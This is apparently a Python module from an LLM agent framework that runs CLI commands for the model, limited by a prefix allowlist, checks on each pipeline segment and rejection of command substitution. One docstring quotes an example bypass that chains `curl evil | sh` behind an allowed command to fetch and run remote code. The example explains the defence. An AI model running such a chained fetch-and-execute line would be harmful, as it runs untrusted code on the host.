"""Tool executor — runs CLI commands via subprocess with a prefix whitelist."""

from __future__ import annotations

import asyncio
import json
import os
import shlex
import shutil
import sys
from pathlib import Path

from core.email_config import himalaya_env


def _find_wacli_bin() -> str:
    """Locate the wacli binary — works in Docker and local dev."""
    env = os.getenv("WACLI_BIN")
    if env and Path(env).exists():
        return env
    from_path = shutil.which("wacli")
    if from_path:
        return from_path
    # Local dev: `go install` / `make dev-wa` drops the binary in ~/go/bin.
    go_bin = Path.home() / "go" / "bin" / "wacli"
    if go_bin.exists():
        return str(go_bin)
    return "wacli"  # fallback — let the shell try PATH


class ToolExecutor:
    """Executes CLI commands on behalf of the LLM."""

    def __init__(self, tool_env: dict[str, str] | None = None) -> None:
        # Extra environment for optional tools (e.g. GH_TOKEN for `gh`).
        # Injected into every spawned subprocess; updated on config reload.
        self.tool_env: dict[str, str] = dict(tool_env or {})

    ALLOWED_PREFIXES = [
        "curl",
        "himalaya",
        "jq",
        "wacli",
        "python3 /app/tools/skills.py",
        "python3 /app/tools/contacts.py",
        "sqlite3",
        "python3 /app/tools/",
        "gh",
        "git",
        "w3m",
        "pandoc",
        "pdftotext",
        "rg",
        "yt-dlp",
        "cal",
    ]

    def _resolve_command(self, command: str) -> str:
        """Rewrite tool paths for local dev when needed."""
        # Resolve bare `wacli` to the full binary path
        if command == "wacli" or command.startswith("wacli "):
            wacli_bin = _find_wacli_bin()
            if wacli_bin != "wacli":
                command = wacli_bin + command[5:]

        # Use the running interpreter (venv-aware) instead of bare `python3`,
        # so tool scripts see the same deps in Docker and local dev.
        if command.startswith("python3 "):
            command = f"{sys.executable} {command[len('python3 ') :]}"

        # Resolve /app/tools/ python script paths for local dev
        if "/app/tools/" not in command:
            return command
        if Path("/app/tools").exists():
            return command
        local_tools_dir = Path(__file__).resolve().parents[1] / "tools"
        if not local_tools_dir.exists():
            return command
        return command.replace("/app/tools/", f"{local_tools_dir}/")

    # Shell operators that separate one command from the next. A run_command
    # string may legitimately pipe between allowlisted tools (`himalaya … | jq …`),
    # so these can't be banned outright — but every resulting segment must itself
    # start with an allowlisted prefix (or a safe downstream filter).
    _SEGMENT_OPS = frozenset({"|", "||", "&&", ";", "&", "\n"})

    # Read-only filters allowed *after* a pipe even though they aren't data
    # sources in ALLOWED_PREFIXES: `curl … | head`, `himalaya … | jq …`. The
    # first pipeline segment must still be an allowlisted prefix — these only
    # ride behind a pipe as pure output filters. `sed`/`awk` are deliberately
    # excluded: both can execute arbitrary code (`awk 'BEGIN{system(...)}'`).
    _SAFE_FILTERS = frozenset(
        {"jq", "head", "tail", "rg", "cat", "sort", "uniq", "wc", "grep", "cut", "tr", "column"}
    )

    @staticmethod
    def _has_live_substitution(command: str) -> bool:
        """True if a backtick or ``$(`` appears outside single quotes.

        :meth:`_exec` runs the command via ``/bin/sh -c``, where command
        substitution stays live inside *double* quotes — only *single* quotes
        make it literal. So a markdown code fence reaches an argument intact
        when single-quoted (``--body '```code```'``) and is rejected when
        unquoted or double-quoted, where sh would actually run the inner
        command. Backslash-escaping inside double quotes is not decoded: we
        stay strict on purpose, since the safe path is single-quoting.
        """
        quote: str | None = None  # None | "'" | '"'
        n = len(command)
        for i, c in enumerate(command):
            if quote == "'":
                if c == "'":
                    quote = None
            elif quote == '"':
                if c == '"':
                    quote = None
                elif c == "`" or (c == "$" and i + 1 < n and command[i + 1] == "("):
                    return True
            elif c in ("'", '"'):
                quote = c
            elif c == "`" or (c == "$" and i + 1 < n and command[i + 1] == "("):
                return True
        return False

    def _command_allowed(self, command: str) -> bool:
        """True if EVERY pipeline/sequence segment is allowlisted.

        A first-token-only check let a chained tail ride in on an allowed head
        (`himalaya x; curl evil | sh` starts with `himalaya`, so it passed). This
        splits the command quote-aware via shlex: a pipe inside quotes — like
        `jq '.a | .b'` — stays one segment, while a real `himalaya … | jq …` splits
        into two. The first segment must start with an allowlisted prefix; a
        downstream segment may instead be a safe read filter (:attr:`_SAFE_FILTERS`).
        Subshells (`( … )`) and command substitution (backticks, `$(…)`) are rejected
        via :meth:`_has_live_substitution`: they run an inner command the prefix
        check would never see. A backtick/`$(` inside single quotes is literal and
        allowed, so markdown bodies survive intact. Last-line hard gate for
        LLM-issued commands only; ``run_command_trusted`` bypasses it.
        """
        if self._has_live_substitution(command):
            return False
        try:
            lex = shlex.shlex(command, posix=True, punctuation_chars=True)
            lex.whitespace_split = True
            tokens = list(lex)
        except ValueError:
            return False  # unbalanced quotes etc. — refuse rather than guess
        if not tokens:
            return False
        segment: list[str] = []
        segments = [segment]
        for tok in tokens:
            if tok in self._SEGMENT_OPS:
                segment = []
                segments.append(segment)
            elif tok in ("(", ")"):
                return False  # bare subshell
            else:
                segment.append(tok)
        for idx, segment in enumerate(segments):
            if not segment:
                continue
            joined = " ".join(segment)
            if any(joined.startswith(p) for p in self.ALLOWED_PREFIXES):
                continue
            # Downstream pipeline stages may be pure read-only filters.
            if idx > 0 and segment[0] in self._SAFE_FILTERS:
                continue
            return False
        return True

    async def run_command(
        self,
        command: str,
        timeout: int = 30,
        tool_env: dict[str, str] | None = None,
        cwd: str | None = None,
    ) -> dict:
        """Execute a shell command and return its output.

        ``tool_env`` overrides the default :attr:`tool_env` for this one call —
        used to inject the active agent's own tool identity (own GH_TOKEN,
        browser profile) so each agent authenticates as itself (#93).

        ``cwd`` is the working directory. The coding harness passes the workspace
        root here so `git clone`/`git` operate in the SAME tree the file tools
        resolve under (#151); ``None`` keeps the process cwd (unchanged default).
        """
        # Security: validate against whitelist
        if not self._command_allowed(command):
            return {
                "error": (
                    "Command not allowed. The first segment must start with one of: "
                    f"{self.ALLOWED_PREFIXES}; a segment after a pipe may instead be a "
                    f"read-only filter ({sorted(self._SAFE_FILTERS)}). Subshells, "
                    "command substitution and backticks are rejected unless single-quoted "
                    "(single quotes make them literal, so quote markdown bodies as '…')."
                )
            }
        # `browser.py explore` runs an inner LLM loop (many page steps) and needs
        # minutes, not the 30s default — otherwise it's always killed mid-booking.
        if "browser.py explore" in command:
            timeout = max(timeout, 480)
        return await self._exec(self._resolve_command(command), timeout, cwd=cwd, tool_env=tool_env)

    async def run_command_trusted(self, command: str, timeout: int = 30) -> dict:
        """Execute a shell command without prefix validation.

        Only use this for commands constructed internally by the agent code,
        never for commands originating from LLM tool calls.
        """
        return await self._exec(self._resolve_command(command), timeout)

    async def run_in_dir(self, command: str, cwd: str, timeout: int = 120) -> dict:
        """Run a shell command in ``cwd`` (no prefix whitelist) for the coding
        harness (#76). Confinement of ``cwd`` to the workspace and per-call ASK
        approval are enforced by the caller (core/coding.py + the agent); this
        only adds the working directory. Builds/tests get a longer default
        timeout than the 30s interactive default."""
        return await self._exec(command, timeout, cwd=cwd)

    async def _exec(
        self,
        command: str,
        timeout: int,
        cwd: str | None = None,
        tool_env: dict[str, str] | None = None,
    ) -> dict:
        """Run a shell command and capture output."""
        # Per-call override (active agent's identity) wins over the shared default.
        agent_scoped = tool_env is not None
        effective_tool_env = self.tool_env if tool_env is None else tool_env
        env = None
        wants_wacli_label = "wacli" in command and "WACLI_DEVICE_LABEL" not in os.environ
        if "himalaya" in command or effective_tool_env or wants_wacli_label or agent_scoped:
            env = os.environ.copy()
            if "himalaya" in command:
                env.update(himalaya_env())
            # wacli: identify the linked device as humux (matches the Docker ENV).
            if wants_wacli_label:
                env.setdefault("WACLI_DEVICE_LABEL", "humux")
            # An agent-scoped override is authoritative over the registry's managed
            # keys: strip any it didn't set so an agent can't inherit a tool
            # credential (e.g. GH_TOKEN from .env) its policy dropped (#93).
            if agent_scoped:
                from core.tools import MANAGED_TOOL_ENV_KEYS

                for key in MANAGED_TOOL_ENV_KEYS - effective_tool_env.keys():
                    env.pop(key, None)
            # Tool auth (e.g. GH_TOKEN) — only set when a tool is enabled.
            env.update(effective_tool_env)
        proc = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            env=env,
            cwd=cwd,
        )
        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            return {
                "stdout": stdout.decode(),
                "stderr": stderr.decode(),
                "exit_code": proc.returncode,
            }
        except TimeoutError:
            proc.kill()
            return {"error": f"Command timed out after {timeout}s"}

    def parse_json_output(self, output: str) -> list | dict:
        """Parse JSON output from CLI tools."""
        try:
            return json.loads(output)
        except json.JSONDecodeError:
            return {"raw": output}
